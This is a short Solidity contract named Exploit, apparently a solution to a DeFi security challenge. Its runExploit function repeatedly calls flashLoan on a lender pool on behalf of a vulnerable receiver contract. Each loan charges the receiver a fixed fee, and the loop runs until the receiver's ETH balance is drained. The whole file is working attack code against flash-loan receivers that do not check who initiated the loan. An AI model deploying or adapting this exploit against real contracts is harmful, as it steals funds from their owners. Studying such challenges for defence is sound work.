import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Exploit {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    IERC3156FlashLender naiveLenderPool;
    IERC3156FlashBorrower receiver;

    constructor(
        IERC3156FlashLender _naiveLenderPool,
        IERC3156FlashBorrower _receiver
    ) {
        naiveLenderPool = _naiveLenderPool;
        receiver = _receiver;
    }

    function runExploit() external {
        while (address(receiver).balance > 0) {
            // Call the flashloan, pass in the vulnerable receiver and make them pay 1 ETH per flashLoan until the contract is empty
            naiveLenderPool.flashLoan(
                receiver,
                ETH,
                naiveLenderPool.maxFlashLoan(ETH),
                ""
            );
        }
    }
}
